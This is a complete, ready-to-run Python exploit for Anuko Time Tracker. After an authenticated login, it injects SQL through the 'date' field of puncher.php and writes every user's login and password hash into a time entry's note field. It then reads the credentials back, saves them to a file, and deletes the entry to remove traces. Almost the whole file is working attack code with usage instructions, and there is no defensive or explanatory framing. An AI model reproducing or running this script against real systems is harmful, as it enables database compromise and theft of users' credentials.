#!/usr/bin/env python3
"""
Anuko Time Tracker SQL Injection Exploit
Author: Security Researcher
Version: 2.0
"""

import argparse
import re
import sys
from datetime import datetime, timedelta
from time import time

import requests
from bs4 import BeautifulSoup


class AnukoExploit:
    def __init__(self, host, username, password):
        """
        Initialize the exploit with target details
        
        Args:
            host (str): Target URL
            username (str): Valid username for login
            password (str): Valid password for login
        """
        self.host = host.rstrip('/')
        self.username = username
        self.password = password
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
    def login(self):
        """
        Authenticate with the target system
        
        Returns:
            bool: True if login successful, False otherwise
        """
        print("[*] Attempting login...")
        
        login_data = {
            "login": self.username,
            "password": self.password,
            "btn_login": "Login",
        }
        
        try:
            response = self.session.post(f"{self.host}/login.php", data=login_data)
            if "Incorrect" in response.text:
                print("[-] Login failed: Invalid credentials")
                return False
            print("[+] Login successful!")
            return True
        except Exception as e:
            print(f"[-] Login error: {str(e)}")
            return False
    
    def get_available_project(self):
        """
        Retrieve available projects from puncher page
        
        Returns:
            str: Project ID or None if no projects available
        """
        print("[*] Checking puncher feature...")
        
        try:
            response = self.session.get(f"{self.host}/puncher.php")
            
            if "Feature is disabled" in response.text:
                print("[-] Puncher feature is disabled")
                return None
            
            soup = BeautifulSoup(response.text, 'lxml')
            project_select = soup.find("select", {"name": "project", "id": "project"})
            
            if not project_select:
                print("[-] No project selection found")
                return None
            
            projects = project_select.find_all("option")
            
            if len(projects) <= 1:
                print("[-] No projects available")
                return None
            
            # Select first available project (skip the default empty option)
            selected_project = projects[1]
            print(f"[+] Selected project: [{selected_project['value']}] - {selected_project.text}")
            return selected_project['value']
            
        except Exception as e:
            print(f"[-] Error getting projects: {str(e)}")
            return None
    
    def start_puncher_session(self, project_id):
        """
        Start a new puncher session
        
        Args:
            project_id (str): ID of the project to use
            
        Returns:
            str: Puncher session ID or None if failed
        """
        current_date = datetime.now()
        
        puncher_data = {
            "project": project_id,
            "btn_start": "Start",
            "browser_today": "",
            "browser_time": current_date.strftime("%H:%M"),
            "date": current_date.strftime("%Y-%-m-%-d")
        }
        
        headers = {"Referer": f"{self.host}/puncher.php"}
        
        try:
            response = self.session.post(
                f"{self.host}/puncher.php", 
                data=puncher_data, 
                headers=headers
            )
            
            if "Uncompleted entry already" in response.text:
                print("[-] A puncher session is already running")
                return None
            
            # Retrieve the puncher entry ID
            date_param = current_date.strftime("%Y-%-m-%-d")
            puncher_page = self.session.get(f"{self.host}/puncher.php?date={date_param}").text
            
            time_edit_ids = re.findall(r"time_edit.php\?id=(\d+)", puncher_page)
            
            if not time_edit_ids:
                print("[-] Could not retrieve puncher session ID")
                return None
            
            session_id = sorted(time_edit_ids)[-1]  # Get latest ID
            print(f"[+] Puncher session started: ID {session_id}")
            return session_id
            
        except Exception as e:
            print(f"[-] Error starting puncher: {str(e)}")
            return None
    
    def execute_sqli(self, project_id):
        """
        Execute SQL injection to extract user credentials
        
        Args:
            project_id (str): Project ID being used
        """
        current_date = datetime.now()
        stop_time = (datetime.now() + timedelta(minutes=10)).strftime("%H:%M")
        
        # SQL Injection payload - extracts all user credentials
        sql_payload = "SELECT group_concat(login,0x3a,password) FROM tt_users"
        
        # Craft malicious date parameter with SQL injection
        malicious_date = f"{current_date.strftime('%Y-%-m-%-d')}', comment=(({sql_payload})), date='{current_date.strftime('%Y-%-m-%-d')}"
        
        exploit_data = {
            "btn_stop": "Stop",
            "browser_today": "",
            "browser_time": stop_time,
            "date": malicious_date
        }
        
        headers = {"Referer": f"{self.host}/puncher.php"}
        
        try:
            # Execute the SQL injection
            self.session.post(
                f"{self.host}/puncher.php", 
                data=exploit_data, 
                headers=headers, 
                allow_redirects=False
            )
            print("[+] SQL injection executed successfully")
            return True
        except Exception as e:
            print(f"[-] SQL injection failed: {str(e)}")
            return False
    
    def extract_credentials(self, session_id):
        """
        Extract credentials from the puncher session
        
        Args:
            session_id (str): Puncher session ID
        """
        print("[*] Extracting credentials...")
        
        try:
            response = self.session.get(f"{self.host}/time_edit.php?id={session_id}")
            soup = BeautifulSoup(response.text, 'lxml')
            
            note_field = soup.find("textarea", {"name": "note", "id": "note"})
            
            if note_field and note_field.text.strip():
                credentials = note_field.text.strip()
                print("\n[+] CREDENTIALS EXTRACTED SUCCESSFULLY!")
                print("=" * 60)
                print(credentials)
                print("=" * 60)
                
                # Save to file
                filename = "extracted_credentials.txt"
                with open(filename, "w") as f:
                    f.write(credentials)
                print(f"[+] Credentials saved to: {filename}")
                return True
            else:
                print("[-] No credentials found in note field")
                return False
                
        except Exception as e:
            print(f"[-] Error extracting credentials: {str(e)}")
            return False
    
    def cleanup(self, session_id):
        """
        Clean up exploited puncher entry
        
        Args:
            session_id (str): Puncher session ID to delete
        """
        print("[*] Cleaning up...")
        
        try:
            cleanup_data = {"delete_button": "Delete", "id": session_id}
            headers = {"Referer": f"{self.host}/time_delete.php?id={session_id}"}
            
            self.session.post(
                f"{self.host}/time_delete.php?id={session_id}", 
                data=cleanup_data, 
                headers=headers
            )
            print(f"[+] Cleanup completed - Entry {session_id} removed")
            return True
        except Exception as e:
            print(f"[-] Cleanup failed: {str(e)}")
            return False
    
    def execute_exploit(self):
        """
        Main exploit execution flow
        """
        print(f"""
╔══════════════════════════════════════════════════════════════╗
║                   ANUKO TIME TRACKER EXPLOIT                ║
║                        Version 2.0                          ║
╚══════════════════════════════════════════════════════════════╝
        
[*] Target: {self.host}
[*] Username: {self.username}
[*] Started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        """)
        
        # Execute exploit steps
        if not self.login():
            return False
        
        project_id = self.get_available_project()
        if not project_id:
            return False
        
        session_id = self.start_puncher_session(project_id)
        if not session_id:
            return False
        
        if not self.execute_sqli(project_id):
            return False
        
        if not self.extract_credentials(session_id):
            return False
        
        self.cleanup(session_id)
        
        print("\n[+] Exploit completed successfully!")
        return True


def display_help():
    """
    Display usage information when no arguments provided
    """
    print("""
Anuko Time Tracker SQL Injection Exploit

USAGE:
    python3 anuko_exploit.py --host http://target.com --username user --password pass

ARGUMENTS:
    --host HOST       Target URL (e.g., http://192.168.1.100/timetracker)
    --username USER   Valid username for authentication
    --password PASS   Valid password for authentication

EXAMPLE:
    python3 anuko_exploit.py --host http://localhost/anuko --username admin --password admin123

OPTIONAL ARGUMENTS:
    -h, --help      Show this help message and exit

FEATURES:
    • Automatic credential extraction via SQL injection
    • Cleanup after exploitation
    • Error handling and user-friendly output
    • Session management for reliable execution
    """)


def main():
    """
    Main execution function
    """
    parser = argparse.ArgumentParser(
        description='Anuko Time Tracker SQL Injection Exploit',
        add_help=False
    )
    
    parser.add_argument('--host', required=False, help='Target URL')
    parser.add_argument('--username', required=False, help='Username for login')
    parser.add_argument('--password', required=False, help='Password for login')
    parser.add_argument('-h', '--help', action='store_true', help='Show help message')
    
    args = parser.parse_args()
    
    # Show help if requested or no arguments provided
    if args.help or not any(vars(args).values()):
        display_help()
        sys.exit(0)
    
    # Validate required arguments
    if not all([args.host, args.username, args.password]):
        print("[-] Error: All arguments (--host, --username, --password) are required!")
        print("\nQuick usage:")
        print("python3 anuko_exploit.py --host http://target.com --username user --password pass")
        sys.exit(1)
    
    # Execute exploit
    exploit = AnukoExploit(args.host, args.username, args.password)
    success = exploit.execute_exploit()
    
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
